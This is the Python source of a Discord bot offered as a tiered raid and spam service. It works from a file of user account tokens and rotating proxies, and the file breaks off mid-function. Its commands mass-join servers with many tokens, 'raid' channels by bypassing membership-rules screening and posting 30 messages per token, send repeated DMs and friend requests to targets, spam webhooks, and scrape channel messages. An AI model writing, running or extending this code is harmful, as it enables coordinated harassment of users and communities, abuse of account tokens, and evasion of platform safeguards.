from discord.ext.commands.core import command
import requests
import time
import asyncio
import discord
from discord.ext import commands
import random
from discord.ext import tasks, commands
import asyncio
from discord_webhook import DiscordWebhook
import os
import json
from discord.ext.commands import BucketType, Cooldown
import threading
from colorama import Fore,Style,Back
 
# Embed Color (dont change)
color = 7419530
# Logs Channel
LogsChannel = 966774384800976926
# Proxy Type
TypeOfProxy = "http"
 
# Bot Version
version = 3.0
# Bot Queues 
queue = []
friendqueue = []
leavequeue = []
 
# Bot Setup
 
intents = discord.Intents().all()
bot = commands.Bot(command_prefix=".",intents=intents, case_insensitive=True)
bot.remove_command('help')
 
 
# Ready Event
 
@bot.event 
async def on_ready():
  guild = bot.get_guild(960588148386201650)
  print(f'Bot Online | Bot Latency {bot.latency} | Proxy Type {TypeOfProxy}')
  await bot.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(guild.members)} users"))
 
 
 
 
 
@bot.event
async def on_command_error(ctx,error):
  if isinstance(error, commands.CommandNotFound):
    embed = discord.Embed(title='Command Not Found', description='Invalid command, try doing .help to see a list of commands!',color=color)
    await ctx.send(embed=embed)
  else:
    if isinstance(error,commands.CommandOnCooldown):
      embed = discord.Embed(title='Cooldown', description=f'Wooah! You have to wait {error.retry_after} seconds!',color=color)
      await ctx.send(embed=embed)
    else:
      print(error)
 
@tasks.loop(seconds=5)
async def leaveserver():
  r = open('tokens.txt', 'r')
  r2 = r.readlines()
  a = (random.choice(r2))
  b = a.strip('\n')
  if len(leavequeue) == 0:
    pass
  else:
    headers = { 
      "authorization": b
    }
    r = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{leavequeue[0]}', headers=headers)
    if r.status_code == 10004:
      channelGet = bot.get_channel(LogsChannel)
      embed = discord.Embed(title='Error!', description=f'Token is not in specified server!',color=color)
      await channelGet.send(embed=embed)
      leavequeue.pop(0)
    else:
      channelGet = bot.get_channel(LogsChannel)
      embed = discord.Embed(title='Left Server', description=f'Token: ------------\nStatus Code {r.status_code}\n\nThis token has left {leavequeue[0]}',color=color)  
      await channelGet.send(embed=embed)
      leavequeue.pop(0)
 
 
leaveserver.start()
 
@bot.command()
@commands.is_owner()
async def leaveallservers(ctx, id):
  embed = discord.Embed(title=f'Leaving {id}',description=f'Leaving All Servers with {id}',color=color)
  await ctx.send(embed=embed)
  lines = open('tokens.txt','r')
  for line in lines.readlines():
    a = line.strip('\n')
    headers = {
      "authorization": a
    }
    await asyncio.sleep(.5)
    r = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{id}', headers=headers)
 
# Friends Users (queue system)
 
@tasks.loop(seconds=5)
async def friender():
  r = open('tokens.txt', 'r')
  r2 = r.readlines()
  a = (random.choice(r2))
  b = a.strip('\n')
  headers = {
    'Authorization': b,
  }
  if len(friendqueue) == 0:
    pass
  else:
    userFetch = await bot.fetch_user(friendqueue[0])
    if isinstance(userFetch,str):
      print('Friend is string')
    else:
      friendname = userFetch.name
      friendtag = userFetch.discriminator
      payload = {"username": friendname,"discriminator": friendtag}
 
      r = requests.post('https://discord.com/api/v9/users/@me/relationships',headers=headers,json=payload)
      if r.status_code == 80000 or r.status_code == 400:
        channelGet = bot.get_channel(LogsChannel)
        embed = discord.Embed(title='Friend Requests Disabled!', description=f'Enable your friend requests, {str(userFetch.name) + str("#") + str(userFetch.discriminator)}',color=color)
        await channelGet.send(embed=embed)
        await channelGet.send(userFetch.mention)
        friendqueue.pop(0)
      elif r.status_code == 204:
        channelGet = bot.get_channel(LogsChannel)
        embed = discord.Embed(title='Sent Friend Requests', description=f'Successfully sent friend request to {userFetch.id}',color=color)
        await channelGet.send(embed=embed)
        friendqueue.pop(0)
      else:
        channelGet = bot.get_channel(LogsChannel)
        embed = discord.Embed(title='Error! ', description=f'Token: ---------------------\nStatus Code: {r.status_code}\n\nThis token is not working!',color=color)
        await channelGet.send(embed=embed)
        friendqueue.pop(0)
 
friender.start()
 
 
@tasks.loop(seconds=4)
async def joiner():
  r = open('tokens.txt', 'r')
  r2 = r.readlines()
  a = (random.choice(r2))
  b = a.strip('\n')
  headers = {
    "Authorization": b,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
    }
  await asyncio.sleep(2)
  if len(queue) == 0:
    pass
  else:
    r = requests.post(f'https://discord.com/api/v9/invites/{queue[0]}', headers=headers,proxies=proxies)
    queue.pop(0)
    if r.json() is not None and r.json()["code"] == 0:
      channelGet = bot.get_channel(LogsChannel)
      embed = discord.Embed(title='Unathorized Token', description='This token is invalid!',color=color)
      await channelGet.send(embed=embed)
    elif r.status_code == 200 and r.json():         
        channelGet = bot.get_channel(LogsChannel)
        embed = discord.Embed(title='Success!', description=f'Token: ---------------------\nStatus Code: {r.status_code}\n\nThis token is working!',color=color)
        await channelGet.send(embed=embed)
        await asyncio.sleep(10)
        if r.json()['guild'] is not None and r.json()['guild']['id'] == 960588148386201650:
          r = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/960588148386201650', headers=headers)
        else:
          pass
    elif r.json()["message"] == "You are at the 100 server limit." and r.json()["message"] is not None:
      channelGet = bot.get_channel(LogsChannel)
      OwnerChannel = bot.get_channel(966774384800976926)
      embed = discord.Embed(title='Max Servers!', description=f'Token: ---------------------\nStatus Code: {r.status_code}\n\nMax Servers have been reached! Developers have been notified!',color=color)
      await channelGet.send(embed=embed)
      embed2 = discord.Embed(title='Token in Max Servers', description=f'Token: {b}',color=color)
      await OwnerChannel.send(embed=embed2)
    elif r.json()['message'] == "You need to verify your account in order to perform this action.":
        channelGet = bot.get_channel(LogsChannel)
        embed = discord.Embed(title='Error!', description=f'Token: ---------------------\nStatus Code: {r.status_code}\n\nThis token is phone/email locked!',color=color)
        await channelGet.send(embed=embed)
 
 
 
joiner.start()
 
 
@bot.command()
@commands.has_permissions(administrator=True)
async def kick(ctx, member: discord.Member):
  embed = discord.Embed(title=f'Kicked {member.name}', description=f'{member.mention} was kicked from the server!',color=color)
  await ctx.send(embed=embed)
  await member.kick()
 
@bot.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member: discord.Member):
  embed = discord.Embed(title=f'Banned {member.name}#{member.discriminator}', description=f'{member.mention} was banned!',color=color)
  await ctx.send(embed=embed)
  await member.ban()
 
@bot.command()
@commands.cooldown(1,5,BucketType.user)
async def help(ctx):
  if ctx.channel.id != 9966774179728879666 and ctx.channel.type != discord.ChannelType.private:
    embed = discord.Embed(title='Commands', description='.help\n.ban\n.kick\n\n `Anti Alt: 7 Days`\n `Anti Spam: 5 Messages`',color=color)
    embed.set_thumbnail(url='https://media.discordapp.net/attachments/980872597778624623/993225096384761966/standard.gif')
    await ctx.send(embed=embed)
    help.reset_cooldown(ctx)
  elif ctx.channel.type == discord.ChannelType.private:
    if "mod" not in ctx.author.name or "admin" not in ctx.author.name:
          BotUser = await bot.fetch_user(757582505154183281)
          embed = discord.Embed(title='My Commands',color=color)
          embed.add_field(name='Help',value='`.help`',inline=True)
          embed.add_field(name='Join',value='`.join [invite] [amount]`',inline=False)
          embed.add_field(name='R4id',value='`.r4id [invite] [channel-id] [message]`',inline=False)
          embed.add_field(name='Updates',value='`.updates`',inline=False)
          embed.add_field(name='Friend',value='`.friend [id]`',inline=False)
          embed.add_field(name='Spam Webhook',value='`.spamwebhook [webhook] [message]`',inline=False)
          embed.add_field(name='DM',value='`.dm [invite] [id] [message]`',inline=False)
          embed.add_field(name='Leave Server',value='`.leaveserver [id]`',inline=False)
          embed.add_field(name='Hypesquad Changer',value='`.hypesquad [hypeid]`',inline=False)
          embed.add_field(name='Change Status',value='`.changestatus [status] (online,offline,dnd,idle)`',inline=False)
          embed.add_field(name='Change About Me',value='`.aboutme [text]`',inline=False)
          embed.add_field(name='Reaction Adder',value='`.reactionadder [invite] [channel-id] [message-id] [emoji]`',inline=False)
          embed.add_field(name='Thread Spammer',value='`.threadspam [invite] [channel-id] [threadname]`',inline=False)
          embed.add_field(name='Retrieve Messages',value='`.retrievemessages [invite] [channel-id] [limit]`',inline=False)
          embed.set_footer(text="AYU V2", icon_url=BotUser.avatar_url)
          await ctx.send(embed=embed)
  else:
    embed = discord.Embed(title='You have to do this in DMS!', description='This command must be done in DMS!',color=color)
    await ctx.send(embed=embed)
    await ctx.send(ctx.author.mention)
 
 
# Proxy
 
balls = open('proxies.txt','r')
balls2 = balls.readlines()
proxies = {
  "http": random.choice(balls2)
}
 
@bot.command()
@commands.is_owner()
@commands.cooldown(1,120,BucketType.user)
async def logintoken(ctx):
  if ctx.channel.type == discord.ChannelType.private:
    embed = discord.Embed(title='Logging Into Token', description='Succesfully logged into token!',color=color)
    await ctx.send(embed=embed)
    def check(m):
      return m.author == ctx.author
    try:
          embed = discord.Embed(title='Token Options', description='[1] Friend User\n[2] DM User\n[3] Join Server\n[4] Change Language\n[5] Report User Account\n[6] Report Server\n[7] Raid Server\n[8] Change Status\n[9] Change About Me\n[10] Mass Ping Server\n[11] Thread Spammer\n[12] Add Card\n[13] Nitro Check (file support included)',color=color)
          embed.set_footer(text='T0ken Options')
          await ctx.send(embed=embed)
          msg = await bot.wait_for('message', check = check, timeout = 60.0)
          if msg.content == "1":
            await ctx.send('User ID: ')
            msg = await bot.wait_for('message',check = check, timeout = 60.0)
            friendqueue.append(msg.content)
            await ctx.send(f'Sent 1 Friend Request To {msg.content}')
          elif msg.content == "3":  
            a = await ctx.send('Server Invite: ')
            msg = await bot.wait_for('message',check = check, timeout = 60.0)
            queue.append(msg.content.split('/')[3])
            await ctx.send('Joined Server with 1 T0ken' )
    except asyncio.TimeoutError: 
      print('b')
 
  else:
    await ctx.send('You must do this command in DMS!')
 
 
@bot.command()
async def join(ctx, serverlink, amount = None):
  allowedChannels = [966774179728879666]
  if ctx.channel.id not in allowedChannels: 
    embed = discord.Embed(
      title="You can't use this command here",
      description='You must use this command in <#966774179728879666> ',
      color=color
    )
    a = await ctx.send(embed=embed)
    await asyncio.sleep(3)
    await a.delete()
  else:
      silverRole = discord.utils.get(ctx.guild.roles,id=963091774350450729)
      BronzeRole = discord.utils.get(ctx.guild.roles,id=963091771217305610)
      GoldRole = discord.utils.get(ctx.guild.roles,id=963091768121901137)
      PremiumRole = discord.utils.get(ctx.guild.roles,id=963091764883910697)
      s = serverlink.split('/')
      if len(s) > 4:
        embed = discord.Embed(title='Nice try, but you cant include 2 links', description='Nice try bud!',color=color)
        await ctx.send(embed=embed)
      else:
        if silverRole in ctx.author.roles:
          if amount is None:
            embed = discord.Embed(title='Joining Server', description=f'Joining {s[3]}  with 5 t0kens! T0kens can sometimes be locked on join!', color=color)
            await ctx.send(embed=embed)
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
          elif amount is not None and int(amount) < 6:
              embed = discord.Embed(title='Joining Server', description=f'Joining {s[3]}  with {amount} t0kens! T0kens can sometimes be locked on join!', color=color)
              await ctx.send(embed=embed)
              for i in range(int(amount)):
                queue.append(s[3])
        elif BronzeRole in ctx.author.roles:
          if amount is None:
            embed = discord.Embed(title='Joining Server', description=f'Joining {s[3]} with 3 t0kens! T0kens can sometimes be locked on join!', color=color)
            await ctx.send(embed=embed)
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
          elif amount is not None and int(amount) < 4:
            embed = discord.Embed(title='Joining Server', description=f'Joining {s[3]} with {amount} t0kens! T0kens can sometimes be locked on join!', color=color)
            await ctx.send(embed=embed)
            for i in range(int(amount)):
              queue.append(s[3])
        elif GoldRole in ctx.author.roles:
          if amount is None:
            embed = discord.Embed(title='Joining Server', description=f'Joining {s[3]} with  10 t0kens! T0kens can sometimes be locked on join!', color=color)
            await ctx.send(embed=embed)
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
          elif amount is not None and int(amount) < 11:
            embed = discord.Embed(title='Joining Server', description=f'Joining {s[3]} with {amount} t0kens! T0kens can sometimes be locked on join!', color=color)
            await ctx.send(embed=embed)
            for i in range(int(amount)):
              queue.append(s[3])
        elif PremiumRole in ctx.author.roles:
          if amount is not None:
            embed = discord.Embed(title='Joining Server', description=f'Joining {s[3]} with 20 t0kens! T0kens can sometimes be locked on join!', color=color)
            await ctx.send(embed=embed)
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
            queue.append(s[3])
          elif amount is not None and int(amount) < 21:
            embed = discord.Embed(title='Joining Server', description=f'Joining {s[3]} with {amount} t0kens! T0kens can sometimes be locked on join!', color=color)
            await ctx.send(embed=embed)
            for i in range(int(amount)):
              queue.append(s[3])
        else:
          embed = discord.Embed(title='Joining Server', description=f'Joining {s[3]} with 2 t0kens! T0kens can sometimes be locked on join! Invite to earn better roles!', color=color)
          await ctx.send(embed=embed)
          queue.append(s[3])
          queue.append(s[3])
 
 
 
 
@bot.command()
async def stock(ctx):
  if ctx.channel.type != discord.ChannelType.private:
    embed = discord.Embed(title='You have to do this in DMS!', description='This command must be done in DMS!',color=color)
    await ctx.send(embed=embed)
    await ctx.send(ctx.author.mention)
  else:
    embed = discord.Embed(title='Robot Test',description='Send 9764 to prove your not a robot!',color=color)
    await ctx.send(embed=embed)
    def check(m):
      return m.author.id == ctx.message.author.id
    try:
      b = await bot.wait_for('message',check=check,timeout=60)
      if b.content != "9764":
        embed = discord.Embed(title='Robot Test Failed', description='You must put 9764!', color=color)
        await ctx.send(embed=embed)
      else:
        await asyncio.sleep(1)
        f = open('tokens.txt', 'r')
        f2 = f.readlines()
        embed = discord.Embed(title='Stock', description=f'Current t0kens: {len(f2)}',color=color)
        await ctx.send(embed=embed)
    except:
      print('a')
 
 
@bot.command()
async def r4id(ctx, link, channel, *, message):
  if ctx.channel.id != 966774179728879666:
    embed = discord.Embed(
      title="You can't use this command here",
      description='You must use this command in <#966774179728879666> ',
      color=color
    )
    a = await ctx.send(embed=embed)
    await asyncio.sleep(3)
    await a.delete()
  elif int(channel) == 966774179728879666 or int(channel) == 896456338509545535 or int(channel) == 896591258875736085 or int(channel) == 896788635729395753 or int(channel) == 896794926933753936:
      embed = discord.Embed(title='Nice try!', description='You cannot r4id our server!',color=color)
      await ctx.send(embed=embed)
  else:
    r = open('tokens.txt')
    r2 = r.readlines()
    a2 = link.split('/')
    print(a2[3])
    r3 = random.choice(r2)
    r20 = random.choice(r2)
    r4 = r3.strip('\n')
    r5 = r20.strip('\n')
    token3 = random.choice(r2)
    token4 = token3.strip('\n')
    embed = discord.Embed(
      title='R4iding Server!',
      description=f'R4iding {a2[3]} with 3 t0kens!',
      color=color
    )
    await ctx.send(embed=embed)
    headers = {
      'Authorization': r4,
      }
    headersbypass = {
      'Authorization': r4,
      'Content-Type': 'application/json'
    }
    headersbypass2 = {
      'Authorization': r5,
      'Content-Type': 'application/json'
    }
    headersbypass3 = {
      'Authorization': token4,
      'Content-Type': 'application/json'
    }
    r = requests.post(f'https://discord.com/api/v9/invites/{a2[3]}', headers=headers)
    headers2 = {
      'Authorization': r5,
      }
    headers3 = {
      'Authorization': token4,
      }
    r9 = requests.post(f'https://discord.com/api/v9/invites/{a2[3]}', headers=headers2)
    r60 = requests.post(f'https://discord.com/api/v9/invites/{a2[3]}', headers=headers3)
    data2 = {
        "content": message
    }
    leavePayload = {
      "lurking": False
    }
    await asyncio.sleep(2)
    bypassrules = {"field_type": "TERMS", "label": "Read and agree to the server rules", "description": None}
    await asyncio.sleep(12)
    if r.json()['channel'] is not None and r.json()['channel']['type'] == 3 or r9.json()['channel']['type'] == 3: 
        leaveguild = requests.delete(f"https://discord.com/api/v9/channels/{r.json()['channel']['id']}",headers=headersbypass, json=leavePayload)
        leaveguild2 = requests.delete(f"https://discord.com/api/v9/channels/{r9.json()['channel']['id']}",headers=headersbypass2, json=leavePayload)
        leaveguild3 = requests.delete(f"https://discord.com/api/v9/channels/{r60.json()['channel']['id']}",headers=headersbypass3, json=leavePayload)
    elif r9.json()['code'] == 30001 and r.json()['code'] == 30001:
      channelGet = bot.get_channel(LogsChannel)
      embed = discord.Embed(title='Max Servers', description='Both t0kens are in max servers! The developers have been notified!', color=color)
      await channelGet.send(embed=embed)
      await channelGet.send(ctx.author.mention)
      ownerChannel = bot.get_channel(896472422331584563)
      embed1 = discord.Embed(title='T0kens in Max Servers', description=f'T0ken 1: {r4}\n\nT0ken 2: {r5}',color=color)
      await ownerChannel.send(embed=embed1)
    elif r9.json()['code'] == 30001 or r.json()['code'] == 30001:
      await asyncio.sleep(3)
      bypassrules1 = requests.put(f"https://discord.com/api/v9/guilds/{r.json()['guild']['id']}/requests/@me",headers=headersbypass,json=bypassrules)
      print
      bypassrules2 = requests.put(f"https://discord.com/api/v9/guilds/{r9.json()['guild']['id']}/requests/@me",headers=headersbypass2,json=bypassrules)
      bypassrules3 = requests.put(f"https://discord.com/api/v9/guilds/{r60.json()['guild']['id']}/requests/@me",headers=headersbypass3,json=bypassrules)
      for i in range(30):
        if i == 30:
          break
        else:
          r2 = requests.post(f'https://discord.com/api/v9/channels/{channel}/messages',data=data2,headers=headers)
          r69 = requests.post(f'https://discord.com/api/v9/channels/{channel}/messages',data=data2,headers=headers2)
          rbob = requests.post(f'https://discord.com/api/v9/channels/{channel}/messages',data=data2,headers=headers3)
          await asyncio.sleep(.8)
      await asyncio.sleep(1)
      leaveguild = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{r.json()['guild']['id']}",headers=headersbypass, payload=leavePayload)
      leaveguild2 = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{r9.json()['guild']['id']}",headers=headersbypass2, payload=leavePayload)
      leaveguild3 = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{r60.json()['guild']['id']}",headers=headersbypass3, payload=leavePayload)
    else:
        await asyncio.sleep(3)
        bypassrules1 = requests.put(f"https://discord.com/api/v9/guilds/{r.json()['guild']['id']}/requests/@me",headers=headersbypass,json=bypassrules)
        bypassrules2 = requests.put(f"https://discord.com/api/v9/guilds/{r9.json()['guild']['id']}/requests/@me",headers=headersbypass2,json=bypassrules)
        bypassrules3 = requests.put(f"https://discord.com/api/v9/guilds/{r60.json()['guild']['id']}/requests/@me",headers=headersbypass3,json=bypassrules)
        for i in range(30):
          if i == 30:
            break
          else:
            r2 = requests.post(f'https://discord.com/api/v9/channels/{channel}/messages',data=data2,headers=headers,proxies=proxies)
            r69 = requests.post(f'https://discord.com/api/v9/channels/{channel}/messages',data=data2,headers=headers2,proxies=proxies)
            rbob = requests.post(f'https://discord.com/api/v9/channels/{channel}/messages',data=data2,headers=headers3,proxies=proxies)
        await asyncio.sleep(1)
        leaveguild = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{r.json()['guild']['id']}",headers=headersbypass, json=leavePayload)
        leaveguild2 = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{r9.json()['guild']['id']}",headers=headersbypass2, json=leavePayload)
        leaveguild3 = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{r60.json()['guild']['id']}",headers=headersbypass3, json=leavePayload)
 
@bot.command()
async def friend(ctx, id):
  if ctx.channel.id != 966774179728879666:
    embed = discord.Embed(
      title="You can't use this command here",
      description='You must use this command in <#966774179728879666> ',
      color=color
    ) 
    a = await ctx.send(embed=embed)
    await asyncio.sleep(3)
    await a.delete()
  else:
      silverRole = discord.utils.get(ctx.guild.roles,id=963091774350450729)
      BronzeRole = discord.utils.get(ctx.guild.roles,id=894258754831405108)
      GoldRole = discord.utils.get(ctx.guild.roles,id=963091768121901137)
      PremiumRole = discord.utils.get(ctx.guild.roles,id=963091764883910697)
      if silverRole in ctx.author.roles:
        embed = discord.Embed(title='Sending Friend Requests', description=f'Sent 5 Friend Request To {id}', color=color)
        await ctx.send(embed=embed)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
      elif BronzeRole in ctx.author.roles:
        embed = discord.Embed(title='Sending Friend Requests', description=f'Sent 3 Friend Request To {id}', color=color)
        await ctx.send(embed=embed)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
      elif GoldRole in ctx.author.roles:
        embed = discord.Embed(title='Sending Friend Requests', description=f'Sent 10 Friend Request To {id}', color=color)
        await ctx.send(embed=embed)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
      elif PremiumRole in ctx.author.roles:
        embed = discord.Embed(title='Sending Friend Requests', description=f'Sent 20 Friend Request To {id}', color=color)
        await ctx.send(embed=embed)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
        friendqueue.append(id)
      else:
        embed = discord.Embed(title='Sending Friend Requests', description=f'Sent 2 Friend Request To {id}', color=color)
        await ctx.send(embed=embed)
        friendqueue.append(id)
        friendqueue.append(id)
 
 
@bot.command(aliases=['webhookspam'])
async def spamwebhook(ctx, url, *, message):
  if ctx.channel.id != 966774179728879666:
    embed = discord.Embed(
      title="You can't use this command here",
      description='You must use this command in <#966774179728879666> ',
      color=color
    )
    a = await ctx.send(embed=embed)
    await asyncio.sleep(3)
    await a.delete()
  else:
    await ctx.message.delete()
    embed = discord.Embed(title='Spamming Webhook', description=f'Spamming webhook 20 times with message {message}',color=color)
    await ctx.send(embed=embed)
    channelGet = bot.get_channel(LogsChannel)
    embed = discord.Embed(title='Spamming Webhook',description=f'Webhook: -----------\n\nSpamming with message {message}',color=color)
    await channelGet.send(embed=embed)
    webhook = DiscordWebhook(url=url, content=message,proxies=proxies)
    for i in range(20):
      webhook.execute()
      await asyncio.sleep(.3)
 
@bot.command()
async def dm(ctx,link,  id, *,message):
  linkbob = link.split('/')
  if ctx.channel.id != 966774179728879666:
    embed = discord.Embed(
      title="You can't use this command here",
      description='You must use this command in <#966774179728879666> ',
      color=color
    )
    a = await ctx.send(embed=embed)
    await asyncio.sleep(3)
    await a.delete()
  else:
    embed = discord.Embed(title=f'DMing {id}', description=f'DMing the user the message {message}',color=color)
    await ctx.send(embed=embed)
    r = open('tokens.txt', 'r')
    r2 = r.readlines()
    a = (random.choice(r2))
    b = a.strip('\n')
    headersdm = {
      "Authorization": b,
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    }
    senddm = requests.post(f'https://discord.com/api/v9/invites/{linkbob[3]}',headers=headersdm)
    await asyncio.sleep(10)
    headers= {
    "Authorization":b,
    "content-type": "application/json",
    }
    payload = {"recipients":[f"{id}"]}
    dmr = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers,json=payload)  
    bob = {
      "content": message
    }
    headers67 = {
      "authorization": b
    }
    await asyncio.sleep(15)
    for i in range(1,25):
      dmr2 = requests.post(f'https://discord.com/api/v9/channels/{dmr.json()["id"]}/messages',headers=headers67,data=bob)
      await asyncio.sleep(.5)
      if "code" in dmr.json() and dmr2.json()["code"] == 50007:
        embed = discord.Embed(title='Cannot DM', description='This user is not in a matual server or friends with the bot!',color=color)
        await ctx.send(embed=embed)
        break
      elif i > 7:
        break
      else:
        pass
 
@bot.command()
async def leaveserver(ctx, id):
  if ctx.channel.id != 966774179728879666:
    embed = discord.Embed(
    title="You can't use this command here",
    description='You must use this command in <#966774179728879666>',
    color=color
    )
    a = await ctx.send(embed=embed)
    await asyncio.sleep(3)
    await a.delete()
  else:
    silverRole = discord.utils.get(ctx.guild.roles,id=963091774350450729)
    BronzeRole = discord.utils.get(ctx.guild.roles,id=894258754831405108)
    GoldRole = discord.utils.get(ctx.guild.roles,id=963091768121901137)
    PremiumRole = discord.utils.get(ctx.guild.roles,id=963091764883910697)
  if silverRole in ctx.message.author.roles or BronzeRole in ctx.author.roles or GoldRole in ctx.author.roles or PremiumRole in ctx.message.author.roles:
    embed = discord.Embed(title='Leaving Server', description=f'Leaving {id}',color=color)
    await ctx.send(embed=embed)
    leavequeue.append(id)
  else:
    embed = discord.Embed(title='Not high enough!', description='Buy or earn in order to get this command!',color=color)
    await ctx.send(embed=embed)
 
@bot.command()
async def hypesquad(ctx, hypeid):
    if ctx.channel.id != 966774179728879666:
      embed = discord.Embed(
      title="You can't use this command here",
      description='You must use this command in <#966774179728879666>',
      color=color
      )
      a = await ctx.send(embed=embed)
      await asyncio.sleep(3)
      await a.delete()
    else:
      if int(hypeid) > 3:
        embed = discord.Embed(title='Invalid ID!', description='Hypesquad ID has to be from 1-3!',color=color)
        await ctx.send(embed=embed)
      else:
        r = open('tokens.txt', 'r')
        r2 = r.readlines()
        a = (random.choice(r2))
        b = a.strip('\n')
        headers = {
          "authorization": b,
          "Content-Type": "application/json"
        }
        payload = {"house_id": hypeid}
        await asyncio.sleep(3)
        r = requests.post('https://discord.com/api/v9/hypesquad/online',headers=headers,json=payload,proxies=proxies)
        if int(hypeid) == 3:
            embed = discord.Embed(title='Set Hypesquad', description='Hypesquad Changed To Balance',color=color)
            await ctx.send(embed=embed)
        elif int(hypeid) == 1:
            embed = discord.Embed(title='Set Hypesquad', description='Hypesquad Changed To Bravery',color=color)
            await ctx.send(embed=embed)
        elif int(hypeid) == 2:
            embed = discord.Embed(title='Set Hypesquad', description='Hypesquad Changed To Brilliance',color=color)
            await ctx.send(embed=embed)
 
@bot.command()
async def aboutme(ctx,*, about):
    if ctx.channel.id != 966774179728879666:
      embed = discord.Embed(
      title="You can't use this command here",
      description='You must use this command in <#966774179728879666>',
      color=color
      )
      a = await ctx.send(embed=embed)
      await asyncio.sleep(3)
      await a.delete()
    else:
      r = open('tokens.txt', 'r')
      r2 = r.readlines()
      a = (random.choice(r2))
      b = a.strip('\n')
      headers = {
        "Authorization": b,
        "Content-Type": "application/json"
      }
      embed = discord.Embed(title='Changed About Me', description=f'About Me was changed to {about}',color=color)
      await ctx.send(embed=embed)
      await asyncio.sleep(10)
      r = requests.patch('https://discord.com/api/v9/users/@me',headers=headers,json={"bio": about})
      channelGet = bot.get_channel(LogsChannel)
      embed2 = discord.Embed(title='T0ken About Me Changed', description=f"T0ken -------------\nStatus Code: {r.status_code}\n\nT0ken About Me was changed to {about.capitalize()}",color=color)
      await channelGet.send(embed=embed2)
 
@bot.command()
@commands.is_owner()
async def changeallaboutme(ctx, *,about):
  lines = open('tokens.txt','r')
  for line in lines.readlines():
    a = line.strip('\n')
    headers = {
    "Authorization": a,
    "Content-Type": "application/json"
    }
    await asyncio.sleep(10)
    r = requests.patch('https://discord.com/api/v9/users/@me',headers=headers,json={"bio": about})
    channelGet = bot.get_channel(LogsChannel)
    embed = discord.Embed(title='Changed About Me', description=f'About Me was changed to {about}',color=color)
    await channelGet.send(embed=embed)
 
@bot.command()
async def changestatus(ctx,status):
    if ctx.channel.id != 966774179728879666:
      embed = discord.Embed(
      title="You can't use this command here",
      description='You must use this command in <#966774179728879666>',
      color=color
      )
      a = await ctx.send(embed=embed)
      await asyncio.sleep(3)
      await a.delete()
    else:
      r = open('tokens.txt', 'r')
      r2 = r.readlines()
      a = (random.choice(r2))
      b = a.strip('\n')
      r = open('tokens.txt', 'r')
      r2 = r.readlines()
      a = (random.choice(r2))
      b = a.strip('\n')
      headers = {
        "authorization": b,
        "Content-Type": "application/json"
      }
      embed = discord.Embed(title='Changed Status', description=f'The status was changed to {status}',color=color)
      await ctx.send(embed=embed)
      await asyncio.sleep(5)
      r = requests.patch('https://discord.com/api/v9/users/@me/settings',headers=headers,json={"status": status})
      channelGet = bot.get_channel(LogsChannel)
      embed2 = discord.Embed(title='T0ken Status Changed', description=f"T0ken -------------\nStatus Code: {r.status_code}\n\nThis t0ken's status was changed to {status.capitalize()}",color=color)
      await channelGet.send(embed=embed2)
 
 
 
@bot.command()
async def retrievemessages(ctx, invite, channelid, limit):
  r = open('tokens.txt', 'r')
  r2 = r.readlines()
  a = (random.choice(r2))
  b = a.strip('\n')
  invite2 = invite.split('/')
  if ctx.channel.id != 966774179728879666:
        embed = discord.Embed(
        title="You can't use this command here",
        description='You must use this command in <#966774179728879666>',
        color=color
        )
        a = await ctx.send(embed=embed)
        await asyncio.sleep(3)
  elif int(limit) < 11:
    headers= {
    "Authorization": b
    }
    headers2= {
    "Authorization": b,
    "Content-type": "application/json"
    }
    senddm = requests.post(f'https://discord.com/api/v9/invites/{invite2[3]}',headers=headers)
    print(senddm.text)
    await asyncio.sleep(10)
    await ctx.author.send('Retrieving Messages, wait 20 seconds!')
    await asyncio.sleep(20)
    dmr = requests.get(f'https://discord.com/api/v9/channels/{channelid}/messages?limit=50', headers=headers2,params={"limit": limit})
    for value in dmr.json():
      await ctx.author.send(str('Message Retrieved: ')  + str(value["content"]))
      await asyncio.sleep(3)
 
@bot.command()
async def reactionadder(ctx, invite, channel, messageid, emoji):
